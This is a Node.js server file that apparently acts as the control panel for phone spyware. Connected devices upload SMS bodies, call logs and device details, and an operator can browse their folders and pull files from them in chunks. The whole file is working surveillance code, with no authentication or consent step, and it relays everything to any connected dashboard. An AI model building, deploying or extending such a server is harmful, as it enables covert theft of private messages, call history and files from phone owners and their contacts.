const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory data storage
const devices = new Map(); // deviceId -> device info
const smsLogs = new Map(); // deviceId -> array of SMS
const callLogs = new Map(); // deviceId -> array of calls
const deviceSockets = new Map(); // deviceId -> socket

// Serve dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  // Handle device info updates
  socket.on('deviceInfo', (data) => {
    const deviceId = data.deviceId;
    
    if (!devices.has(deviceId)) {
      devices.set(deviceId, {
        deviceId: deviceId,
        deviceName: data.deviceName || 'Unknown',
        deviceModel: data.deviceModel || 'Unknown',
        battery: data.battery || 0,
        charging: data.charging || false,
        lastSeen: new Date(),
        active: true
      });
    } else {
      const device = devices.get(deviceId);
      device.battery = data.battery || device.battery;
      device.charging = data.charging !== undefined ? data.charging : device.charging;
      device.lastSeen = new Date();
      device.active = true;
      devices.set(deviceId, device);
    }

    deviceSockets.set(deviceId, socket);

    // Broadcast updated device list to all web clients
    io.emit('deviceList', Array.from(devices.values()));
  });

  // Handle new SMS
  socket.on('newSMS', (data) => {
    const deviceId = data.deviceId;
    
    if (!smsLogs.has(deviceId)) {
      smsLogs.set(deviceId, []);
    }
    
    const smsList = smsLogs.get(deviceId);
    smsList.push({
      number: data.number,
      body: data.body,
      type: data.type,
      date: data.date,
      timestamp: new Date()
    });
    
    smsLogs.set(deviceId, smsList);
    
    // Notify web clients
    io.emit('newSMS', data);
  });

  // Handle new Call
  socket.on('newCall', (data) => {
    const deviceId = data.deviceId;
    
    if (!callLogs.has(deviceId)) {
      callLogs.set(deviceId, []);
    }
    
    const callList = callLogs.get(deviceId);
    callList.push({
      number: data.number,
      type: data.type,
      duration: data.duration,
      date: data.date,
      timestamp: new Date()
    });
    
    callLogs.set(deviceId, callList);
    
    // Notify web clients
    io.emit('newCall', data);
  });

  // Handle file list request
  socket.on('fileList', (data) => {
    io.emit('fileList', data);
  });

  // Handle file chunk response
  socket.on('fileChunk', (data) => {
    io.emit('fileChunk', data);
  });

  // Request files from device
  socket.on('requestFileList', (data) => {
    const { deviceId, path } = data;
    const deviceSocket = deviceSockets.get(deviceId);
    if (deviceSocket) {
      deviceSocket.emit('requestFiles', path || '/');
    }
  });

  // Request file download from device
  socket.on('requestFileDownload', (data) => {
    const { deviceId, filePath } = data;
    const deviceSocket = deviceSockets.get(deviceId);
    if (deviceSocket) {
      deviceSocket.emit('requestFileDownload', filePath || '');
    }
  });

  // Request next file chunk
  socket.on('requestFileChunk', (data) => {
    const { deviceId, filePath, offset } = data;
    const deviceSocket = deviceSockets.get(deviceId);
    if (deviceSocket) {
      deviceSocket.emit('requestFileChunk', filePath || '', offset || 0);
    }
  });

  // Handle disconnection
  socket.on('disconnect', () => {
    console.log('Disconnected:', socket.id);
    
    // Find and mark device as inactive
    for (const [deviceId, deviceSocket] of deviceSockets.entries()) {
      if (deviceSocket.id === socket.id) {
        const device = devices.get(deviceId);
        if (device) {
          device.active = false;
          devices.set(deviceId, device);
          io.emit('deviceList', Array.from(devices.values()));
        }
        break;
      }
    }
  });
});

// API endpoints for getting logs
app.get('/api/sms/:deviceId', (req, res) => {
  const deviceId = req.params.deviceId;
  const sms = smsLogs.get(deviceId) || [];
  res.json(sms);
});

app.get('/api/calls/:deviceId', (req, res) => {
  const deviceId = req.params.deviceId;
  const calls = callLogs.get(deviceId) || [];
  res.json(calls);
});

// Check device status periodically
setInterval(() => {
  const now = new Date();
  for (const [deviceId, device] of devices.entries()) {
    const timeDiff = now - device.lastSeen;
    if (timeDiff > 15000) { // 15 seconds
      device.active = false;
      devices.set(deviceId, device);
    }
  }
  io.emit('deviceList', Array.from(devices.values()));
}, 5000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log('Dashboard available at http://192.168.31.53:3000');
});
